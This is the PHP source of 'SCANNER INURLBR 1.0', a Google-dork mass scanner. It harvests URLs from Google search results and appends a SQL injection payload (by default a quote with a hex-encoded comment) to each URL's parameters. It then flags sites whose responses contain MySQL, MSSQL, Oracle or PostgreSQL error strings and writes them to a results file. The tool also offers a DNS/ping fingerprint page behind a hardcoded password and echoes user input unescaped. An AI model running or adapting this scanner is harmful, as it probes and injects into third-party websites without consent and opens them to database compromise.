<?php
/*
  ##########################################################################################
 *  SCANNER INURLBR     1.0
 *  PHP Version         5.4.7
 *  php5-curl           LIB
 *  cURL support	enabled
 *  cURL Information	7.24.0
 *  Apache              2.4
 *  allow_url_fopen =   On
 *  Motor de busca      GOOGLE
 *  Permissão            Leitura & Escrita 
 *  -------------------------------------------------------------------------------------
 *  BUSCA POSSÍVEIS VULNERABILIDADES
 *  SQLI(MySQL,MS ACCESS,Microsoft SQL Server,ORACLE,POSTGRESQL) OU ERROS DE PROGRAMAÇÃO.
 *  
 *  GRUPO GOOGLEINURL BRASIL - PESQUISA AVANÇADA.
 *  fb.com/GoogleINURL
 *  twitter.com/GoogleINURL
 *  blog.inurl.com.br
  ##########################################################################################
 */

$googleHost = "www.google.com.br www.google.pt www.google.com.bo www.google.com.my www.google.ru 
www.google.co.jp www.google.com.ar www.google.es www.google.it www.google.co.uk 
www.google.com www.google.ac www.google.ad www.google.ae www.google.com.af 
www.google.com.ag www.google.com.ai www.google.am www.google.it.ao www.google.com.ar 
www.google.as www.google.at www.google.com.au www.google.az www.google.ba www.google.com.bd 
www.google.be www.google.bf www.google.bg www.google.com.bh www.google.bi www.google.bj 
www.google.com.bn www.google.com.bo www.google.com.br www.google.bs www.google.co.bw 
www.google.com.by www.google.com.bz www.google.ca www.google.com.kh www.google.cc 
www.google.cd www.google.cf www.google.cat www.google.cg www.google.ch www.google.ci 
www.google.co.ck www.google.cl www.google.cm www.google.cn www.google.com.co www.google.co.cr 
www.google.com.cu www.google.cv www.google.cz www.google.de www.google.dj www.google.dk www.google.dm 
www.google.com.do www.google.dz www.google.com.ec www.google.ee www.google.com.eg www.google.es 
www.google.com.et www.google.fi www.google.com.fj www.google.fm www.google.fr www.google.ga 
www.google.ge www.google.gf www.google.gg www.google.com.gh www.google.com.gi www.google.gl 
www.google.gm www.google.gp www.google.gr www.google.com.gt www.google.gy www.google.com.hk 
www.google.hn www.google.hr www.google.ht www.google.hu www.google.co.id www.google.iq 
www.google.ie www.google.co.il www.google.im www.google.co.in www.google.io www.google.is 
www.google.it www.google.je www.google.com.jm www.google.jo www.google.co.jp www.google.co.ke 
www.google.ki www.google.kg www.google.co.kr www.google.com.kw www.google.kz www.google.la 
www.google.com.lb www.google.com.lc www.google.li www.google.lk www.google.co.ls www.google.lt 
www.google.lu www.google.lv www.google.com.ly www.google.co.ma www.google.md www.google.me 
www.google.mg www.google.mk www.google.ml www.google.mn www.google.ms www.google.com.mt 
www.google.mu www.google.mv www.google.mw www.google.com.mx www.google.com.my www.google.co.mz 
www.google.com.na www.google.ne www.google.com.nf www.google.com.ng www.google.com.ni www.google.nl 
www.google.no www.google.com.np www.google.nr www.google.nu www.google.co.nz www.google.com.om 
www.google.com.pa www.google.com.pe www.google.com.ph www.google.com.pk www.google.pn 
www.google.com.pr www.google.ps www.google.pt www.google.com.py www.google.com.qa www.google.ro 
www.google.rs www.google.ru www.google.rw www.google.com.sa www.google.com.sb www.google.sc 
www.google.se www.google.com.sg www.google.sh www.google.si www.google.sk www.google.com.sl 
www.google.sn www.google.sm www.google.so www.google.st www.google.com.sv www.google.td 
www.google.tg www.google.co.th www.google.tk www.google.tl www.google.tm www.google.to www.google.com.tn 
www.google.com.tr www.google.tt www.google.com.tw www.google.co.tz www.google.com.ua www.google.co.ug 
www.google.co.uk www.google.us www.google.com.uy www.google.co.uz www.google.com.vc www.google.co.ve 
www.google.vg www.google.co.vi www.google.com.vn www.google.vu www.google.ws www.google.co.za 
www.google.co.zm www.google.co.zw ";
$googleHost = explode(" ", $googleHost);




error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '64M');
ini_set("max_execution_time", 0);
ini_set("allow_url_fopen", 1);
ini_set("default_socket_timeout", 5);
header('Content-Type: text/html; charset=UTF-8');

if (!isset($_SESSION)) {
    session_start();
}
if (isset($_GET['senha']) && $_GET['senha'] == 'googleinurl') { // VALIDANDO SENHA:googleinurl
    $_SESSION['valida'] = 1; //SETANDO O VALIDADOR DA PAGINA
}
if ($_SESSION['valida'] != 1) { // SE _SESSION VALIDA for diferente de 1 ele não deixa pagina ser carregada
    echo 'SEM ACESSO!';
    unset($_SESSION['valida']);
    EXIT();
}
if (isset($_GET['sair']) && $_GET['sair'] == 'ok') { //SAIR DO SISTEMA
    unset($_SESSION['valida']);
    session_destroy();
    EXIT();
}
if (preg_match('|MSIE ([0-9].[0-9]{1,2})|', $_SERVER['HTTP_USER_AGENT'])) {
    echo "<h1 style='text-size:14px;text-align:center;'>Favor usar um navegador que preste!</br>Please use a browser that pay!<br>
          <img src='http://1.bp.blogspot.com/_0MpBNlJrdds/TU0x2KYVbQI/AAAAAAAAAbM/ryjvYAy32K4/s320/Fuck%2BYou.png'></h1>";
    EXIT();
}

function plus() {
    ob_flush();
    flush();
}

function nslookup($dominio, $op) {
    system("nslookup -querytype={$op} " . escapeshellarg($dominio), $dados);

    if ($dados[0] == '') {
        print_r("$op Sem informações\n");
        return FALSE;
    }
    return print_r($dados);
}

function ping($dominio) {
    $comando = (strstr(PHP_OS, 'LINUX') ? '-c 4' : NULL);
    system("ping {$comando} " . escapeshellarg($dominio), $dados);

    if ($dados[0] == '') {
        print_("$op Sem informações\n");
        return FALSE;
    }
    return print_r($dados);
}

$stylePags = "<link href='http://fonts.googleapis.com/css?family=Aldrich' rel='stylesheet' type='text/css'>
    <style>
      body
        {
            background-color:#000000;
            background-repeat: no-repeat; 
            background-attachment: fixed; 
            background-image: url('http://4.bp.blogspot.com/-oshfxKaYckY/Umf7Bn79PKI/AAAAAAAACzE/yGU2KXxqc-k/s1600/Black-Texture-Background.png');
            background-width: 100%; 
            background-height: 100%; 
            background-size: 100%;
            font-family: 'Aldrich', sans-serif;
            _height: 100%;
            _overflow: auto;


        }
        h1
        {   
            color:#006400;
            text-align:center;
        }
        info{
            color:#fff;
            text-align:center;

        }
        cont{
            color:#900000;
            text-align:center;

        }
        vull{
            color:#900000;

        }
        campoHttp{
            color:#0066FF;
        }
        valorHttp{
            color:#003399;
        }

        p,label
        {
            font-size:15px;
            color:#00FF00;
        }
        a:link, a:visited, a:active {
            text-decoration: none;
            color:#fff; 
        }
        a:hover {text-decoration: underline;  
                 color:#fff; 
                 font-size:105%; 
        }
        ico{
            width: 16px; 
            height: 16px;
        }
        .bordas {
            background:#000;
            border-color: #1C1C1C;
            border-width: 1px;
            border-style: solid;
            margin: auto;
            padding:10px;
            -moz-border-radius:7px;
            -webkit-border-radius:7px;
            border-radius:7px;
            opacity:0.75;
            -moz-opacity: 0.75;
            filter: alpha(opacity=75);
        }
        .resultado {
            background:#000;
            background-image: url('http://i.imgur.com/zHNCk2e.gif');
            border-color: #fff;
            border-width: 1px;
            border-style: solid;
            color:#fff;
            margin: auto;
            width: 95%; 
            padding:10px;
            -moz-border-radius:7px;
            -webkit-border-radius:7px;
            border-radius:7px;
            opacity:0.85;
            -moz-opacity: 0.85;
            filter: alpha(opacity=85);



        }
        .botao {
            background-color: #000;
            font: 14px Arial, sans-serif;
            color: #006400;
        }
        input {
            background:#000; 
            border:1px dashed #006400;
            color: #fff;
            -moz-border-radius:7px;
            -webkit-border-radius:7px;
            border-radius:7px;
        }  
         select {
            background:#000; 
            border:1px dashed #006400;
            color: #fff;
            -moz-border-radius:7px;
            -webkit-border-radius:7px;
            border-radius:7px;
        } 


        #menu-vertical{
            position:fixed;
            top:120px;
            overflow:hidden;
        }

        </style>";
$desc = "<center>
<p>
<a href='http://blog.inurl.com.br' title='BLOG GOOGLE INURL - BUSCA AVANÇADA' alt='BLOG INURL - BUSCA AVANÇADA'>[ blog.inurl.com.br ] - " . date('d/m/Y H:i:s') . "</a>
</p>
</center>";

if ($_GET['comando'] == 'phpinfo') {
    echo $stylePags . "<style>body {background-image: url('https://fbcdn-sphotos-h-a.akamaihd.net/hphotos-ak-prn2/1393784_621123304605061_2072400223_n.jpg');}</style>";
    phpinfo();
    EXIT();
}
if ($_GET['comando'] == 'cript') {
    echo '<form action="bot.php" method="post" align="center">
             <label>CRIT.: <input type="text"  name="achar" size="40"></label>
             <label><input class="botao" type="submit" value="Pesquisar..."></label>
          </form>';
    echo $stylePags;
    EXIT();
}
if ($_GET['comando'] == 'fingeprint') {
    echo $stylePags . "<style>body {background-image: url('https://fbcdn-sphotos-h-a.akamaihd.net/hphotos-ak-prn2/1393784_621123304605061_2072400223_n.jpg');}</style>";
    $valor = (isset($_POST['servidor'])) ? $_POST['servidor'] : NULL;
    echo "<div class='resultado'><form action='bot.php?comando=fingeprint' method='post' align='center' >
             <label>SERVIDOR.: <input type='text'  value='{$valor}' name='servidor' size='40'></label>
             <label><input class='botao' type='submit' value='FINGEPRINT...'></label>
             <div class='resultado'>HOST ou IP Ex:google.com.br ou 190.98.170.158</div>
          </form><pre><div class='resultado'><info>RESULTADO: ";
    if ($valor) {
        echo '<p><info>RESPOSTA HTTP:</info></p><campoHttp>';
        var_dump(get_headers($_POST['servidor'], 1));
        var_dump(infoserver($_POST['servidor'], 1));
        echo '</campoHttp><p><info>NSLOOKUP MX:</info></p><campoHttp>';
        nslookup($_POST['servidor'], "MX");
        echo '</campoHttp><p><info>NSLOOKUP TXT:</info></p><campoHttp>';
        nslookup($_POST['servidor'], "TXT");
        echo '</campoHttp><p><info>NSLOOKUP NS:</info></p><campoHttp>';
        nslookup($_POST['servidor'], "NS");
        echo '</campoHttp><p><info>NSLOOKUP CNAME:</info></p><campoHttp>';
        nslookup($_POST['servidor'], "CNAME");
        echo '<p><info>RESPOSTA PING:</info></p><campoHttp>';
        ping($_POST['servidor']);
        echo '</info></div>';
    }
    EXIT();
}

$_SESSION['vull_style'] = NULL;
$_SESSION['resultado_vull'] = NULL;
?>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" >
<head>
    <title>SCANNER INURLBR 1.0 - [ blog.inurl.com.br ]</title>

    <?php echo $stylePags; ?>

    <script type="text/javascript">

        function popUpCal(url)
        {
            var width = screen.width;
            var height = screen.height;
            var left = parseInt((screen.availWidth / 2) - (width / 2));
            var top = parseInt((screen.availHeight / 2) - (height / 2));
            var windowFeatures = "width=1000,height=1000,scrollbars=1,status=0,resizable=1,left=" + left + ",top=" + top +
                    "screenX=" + left + ",screenY=" + top + "";

            window.open(url + "&w=" + width + "&h=" + height, "", windowFeatures, "GET");
        }
    </script>
</head>
<body >
<center>
    <img src='http://2.bp.blogspot.com/-yETqu9tdT50/UlhxshIXcUI/AAAAAAAACus/kYGP_3pXpTs/s1600/logo.png' style='height: 250px;'/><br>
    <?php echo $desc; ?>

</center>

<div class='resultado' >

    <form action="bot.php" method="post">
        <label>*DORK...: <input type="text" value='<?php echo isset($_POST['dork']) ? $_POST['dork'] : NULL; ?>'  name="dork" size="55"></label>
        <label>PROXY..:  <input type="text" value='<?php echo isset($_POST['proxy']) ? $_POST['proxy'] : NULL; ?>' name="proxy" size="15"></label>
        <label>PORTA..:  <input type="text" value='<?php echo isset($_POST['porta']) ? $_POST['porta'] : NULL; ?>' name="porta" size="9"></label> / 
        <label><input class="botao" type="submit" value="Pesquisar..."></label>
        <label>HOST GOOGLE..:
            <?php
            echo '<select name="googleHost">';
            foreach ($googleHost as $key => $value) {
                $selct = ($value == $_POST['googleHost']) ? 'selected' : NULL;
                echo (isset($value)) ? "<option value='{$value}' {$selct}>{$value}</option>" : NULL;
            }
            echo '</select>';
            ?>
        </label>
        <label><a href="bot.php?sair=ok" style='margin:10px;'>(x)</a></label>
        <p>
            <label>*ARQUIVO SAÍDA.: <input type="text" value='<?php echo isset($_POST['arquivo']) ? $_POST['arquivo'] : 'resultados.txt'; ?>' name="arquivo" size="30"></label>
            <label>0xEXPL01T.: <input type="text" value="<?php echo isset($_POST['exploit']) ? $_POST['exploit'] : "'0x272D2D3B"; ?>" name="exploit" size="40"></label>
            <label>ACHAR ERRO.: <input type="text" value="<?php echo isset($_POST['achar']) ? $_POST['achar'] : NULL; ?>" name="achar" size="40"></label>
        </p>
        <p>
            <label>*BUSCAR ERROS: <input type="radio" name="tipoerro" value="padrao" <?php echo ($_POST['tipoerro'] == 'padrao') ? 'checked' : NULL; ?>>[ PADRÃO ] / </label>
            <label> <input type="radio" name="tipoerro" value="personalizado" <?php echo ($_POST['tipoerro'] == 'personalizado') ? 'checked' : NULL; ?>>[ PERSONALIZADO ]</label>
            <label><a href="#" style='margin:5px;' onclick="javascript:popUpCal('bot.php?comando=phpinfo')"> (INFOPHP) </a></label>
            <label><a href="#" style='margin:5px;' onclick="javascript:popUpCal('bot.php?comando=cript')"></a></label>
            <label><a href="#" style='margin:5px;' onclick="javascript:popUpCal('bot.php?comando=fingeprint')"> (FINGEPRINT) </a></label>
        </p>
    </form>
</div>

<div class='resultado' >
    <?php
    $config[] = array();
    $config['dork'] = urlencode(opcao(isset($_POST['dork']) ? $_POST['dork'] : '', "DORK!"));
    $config['host'] = opcao($_POST['googleHost'], "HOST GOOGLE!");
    $config['arquivo'] = opcao($_POST['arquivo'], "ARQUIVO!");
    $config['tipoerro'] = opcao($_POST['tipoerro'], "TIPO DE ERRO!");
    $config['ipProxy'] = (isset($_POST['proxy']) && !empty($_POST['proxy'])) ? $_POST['proxy'] : NULL;
    $config['porta'] = (isset($_POST['porta']) && !empty($_POST['porta'])) ? $_POST['porta'] : NULL;
    echo (!isset($_POST['exploit']) && empty($_POST['exploit'])) ? '<info>EXPLOIT SEM DEFINIÇÃO!</info>' : NULL;

    $config['url'] = "/search?q={$config['dork']}&num=1500&btnG=Search";
    $config['port'] = 80;
    $config['host'] = trim($config['host']);
    $packet = "GET {$config['url']} HTTP/1.0\r\n";
    $packet.="Host: {$config['host']}\r\n";
    $packet.="Connection: Close\r\n\r\n";

    function opcao($valor, $op) {

        if (isset($valor) && !empty($valor)) {

            return $valor;
        } else {

            echo "<info>FALTA DEFINIR..::: {$op}</info>
            {$desc}";
            exit();
        }
    }

    function eviarPacote($packet, $config) {

        if (isset($config['ipProxy'])) {
            $ock = fsockopen($config['ipProxy'], $config['porta']);
            if (!$ock) {
                echo "<info>Proxy não responde {$config['ipProxy']} : {$config['porta']}</info>";
                die;
            }
        } else {

            $ock = fsockopen(gethostbyname($config['host']), $config['port']);
            if (!$ock) {
                echo "<info>Host não responde {$config['host']} : {$config['port']}</info>";
                die;
            }
        }

        fputs($ock, $packet);
        $buffer = NULL;
        while (!feof($ock)) {
            $buffer.=fgets($ock);
        }
        fclose($ock);
        return($buffer);
    }

    function infoserver($url_, $op = null) {

        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $url_);
        curl_setopt($c, CURLOPT_USERAGENT, 'Mozilla/5.' . date('s') . '(Windows; U; Windows NT 6.' . date('s') . '; en-US; rv:1.' . date('s') . '.1.2) Gecko/2009072' . date('s') . ' Firefox/3.' . date('s') . '.2 GTB5');
        curl_setopt($c, CURLOPT_HEADER, 1);
        curl_setopt($c, CURLOPT_NOBODY, 0);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($c, CURLOPT_FRESH_CONNECT, 1);
        curl_setopt($c, CURLOPT_VERBOSE, 1);
        curl_setopt($c, CURLOPT_COOKIEFILE, 'cookie.txt');
        curl_setopt($c, CURLOPT_COOKIEJAR, 'cookie.txt');

        $corpo = (curl_exec($c));
        $server = curl_getinfo($c);
        $sys = get_headers($url_);

        if (isset($corpo)) {

            if (isset($op)) {
                return $server;
            }

            $dadoTipoBD = verificaErro($corpo);
            $_SESSION['vull_style'] = (isset($dadoTipoBD) && !empty($dadoTipoBD)) ? 'style="color:#006400;"' : NULL;
            $_SESSION['resultado_vull'].=(isset($dadoTipoBD) && !empty($dadoTipoBD)) ? "|{$url_}" : NULL;
        } else {

            return FALSE;
        }

        return $info = "
            <campoHttp><img src='http://icons.iconarchive.com/icons/fatcow/farm-fresh/24/counter-icon.png'/>/ HTTP_CODE:</campoHttp> 
            <valorHttp>{$server['http_code']}</valorHttp> 
            <campoHttp><img src='http://icons.iconarchive.com/icons/fatcow/farm-fresh/24/ip-class-icon.png'/>/ IP SERVER:</campoHttp> 
            <valorHttp>{$server['primary_ip']}</valorHttp>  
            <campoHttp><img src='http://icons.iconarchive.com/icons/fatcow/farm-fresh/24/door-in-icon.png'/>/ PORTA SERVER:</campoHttp> 
            <valorHttp>{$server['primary_port']}</valorHttp>
            <campoHttp><img src='http://icons.iconarchive.com/icons/fatcow/farm-fresh/24/computer-go-icon.png'/>/ WEB SERVER:</campoHttp>
            <valorHttp>{$sys['2']}</valorHttp><br>
            <vull>{$dadoTipoBD}</vull>
            ";
    }

    function formatarResult($html) {

        preg_match_all('#\b((((ht|f)tps?://)|(www|ftp)\.)[a-zA-Z0-9\.\#\@\:%_/\?\=\~\-]+)#i', $html, $match);
        $contUrl = 1;
        $contTotal = 0;
        $match[1] = array_unique($match[1]);
        plus();
        for ($i = 0; $i < count($match[1]); $i++) {

            if (isset($match[1][$i]) && !strstr($match[1][$i], "google") && !strstr($match[1][$i], "youtube") && !strstr($match[1][$i], "orkut") && !strstr($match[1][$i], "schema") && !strstr($match[1][$i], "blogger")) {

                $info = infoserver(gerarErroDB(urldecode($match[1][$i])));
                $url = gerarErroDB(urldecode($match[1][$i]));
                $url = "<a target='_black' href={$url} {$_SESSION['vull_style']}>{$url}</a>";

                echo "<p class='bordas'>
                      <info>[<cont>{$contUrl}</cont>] - </info>  <url>{$url}</url> </br>{$info}
		      </p>";
                $contUrl++;
                $contTotal++;
            }
        }
        plus();
        $resultado = (isset($_SESSION['resultado_vull'])) ? $_SESSION['resultado_vull'] : exit();
        $resultado = explode("|", $resultado);
        $contRes = count($resultado) - 1;
        $resultadotxt = NULL;
        $nomeArquivo = "{$_POST['arquivo']}";
        $resultadotxt = base64_decode("U0NBTk5FUiBJTlVSTEJSIDEuMCAtIFsgYmxvZy5pbnVybC5jb20uYnIgXQ==") . " /DATA:" . date("d/m/Y H:i:s") . " /DORK: {$_POST['dork']}  /EXPLOIT: {$_POST['exploit']}\r\nTOTAL VULL:{$contRes}\r\n " . implode("\r\n", $resultado) . "\r\n\r\n";
        $resultado = implode("<br>", $resultado);


        print_r("<div class='resultado'>
                 <p>TOTAL DE URL's: <info>{$contTotal}</info></p>
                 <p>EXPLOIT USADO: <info>{$_POST['exploit']}</info></p>    
                 <p>DORK: <info>{$_POST['dork']}</info></p>
		 <p>TOTAL DE POSSÍVEIS VULL: <info>{$contRes}</info></p>
		 <p>ARQUIVO COM RESULTADO: <info><a href='{$nomeArquivo}' target='_black'>{$nomeArquivo}</a></info></p>	
		 <p>LISTA: </p>
		 <p>{$resultado}<p>
		 </div>");

        $_SESSION['resultado_vull'] = NULL;
        $abrirtxt = fopen($nomeArquivo, "a");
        if ($abrirtxt == false) {
            die('Não foi possível criar o arquivo.');
        }
        fwrite($abrirtxt, $resultadotxt);
        fclose($abrirtxt);
    }

    function validaBD($html_, $verificar, $bd) {

        return (strstr($html_, $verificar)) ? $bd : null;
    }

    function verificaErro($html_) {

        #ERROS BANCO DE DADOS
        if (isset($_POST['tipoerro']) && $_POST['tipoerro'] == 'padrao') {
            $erro['MYSQL-01'] = 'mysql_';
            $erro['MYSQL-02'] = 'You have an error in your SQL syntax;';
            $erro['MYSQL-03'] = 'Warning: mysql_';
            $erro['MYSQL-04'] = 'function.mysql';
            $erro['MYSQL-05'] = 'MySQL result index';
            $erro['MYSQL-06'] = 'syntax;';
            $erro['MYSQL-07'] = 'MySQL';

            $erro['MICROSOFT-01'] = 'Microsoft JET Database';
            $erro['MICROSOFT-02'] = 'ODBC Microsoft Access Driver';
            $erro['MICROSOFT-03'] = '500 - Internal server error';
            $erro['MICROSOFT-04'] = 'Microsoft OLE DB Provider';
            $erro['MICROSOFT-05'] = 'Unclosed quotes';
            $erro['MICROSOFT-06'] = 'ADODB.Command';
            $erro['MICROSOFT-07'] = 'ADODB.Field error';
            $erro['MICROSOFT-08'] = 'Microsoft VBScript';

            $erro['ORACLE-01'] = 'Microsoft OLE DB Provider for Oracle';
            $erro['ORACLE-02'] = 'ORA-';

            $erro['POSTGRESQL-01'] = 'pg_';
            $erro['POSTGRESQL-02'] = 'Warning: pg_';
            $erro['POSTGRESQL-03'] = 'PostgreSql Error:';

            #ERROS PHP
            $erro['ERROPHP-01'] = 'Warning: include';
            $erro['ERROPHP-02'] = 'Fatal error: include';
            $erro['ERROPHP-03'] = 'Warning: require';
            $erro['ERROPHP-04'] = 'Fatal error: require';
            $erro['ERROPHP-05'] = 'ADODB_Exception';

            #ERROS ASP
            $erro['ERROASP-01'] = 'Version Information: Microsoft .NET Framework';
            $erro['ERROASP-02'] = "Server.Execute Error";

            #ERROS INDEFINIDOS
            $erro['INDEFINIDO-01'] = 'SQL';
            $erro['INDEFINIDO-02'] = 'Fatal error';
            $erro['INDEFINIDO-03'] = 'Warning';
        } else {

            $erro['ERRRO-PERSONALIZADO'] = $_POST['achar'];
        }

        foreach ($erro as $campo => $valor) {

            if (validaBD($html_, $erro[$campo], $campo)) {
                return("Tipo de erro: {$campo}  -  ERRO: {$erro[$campo]}");
            }
        }
    }

    function gerarErroDB($_url) {

        $_url = explode("=", $_url);
        $get = max(array_keys($_url));
        $get = $_url[$get];
        $config['exploit'] = (isset($_POST['exploit'])) ? $_POST['exploit'] : NULL;
        return implode("=", str_replace($get, $get . $config['exploit'], $_url));
    }

    $html = eviarPacote($packet, $config);

    print_r(formatarResult($html));

    echo $desc;
    ?>

</div>
</body>
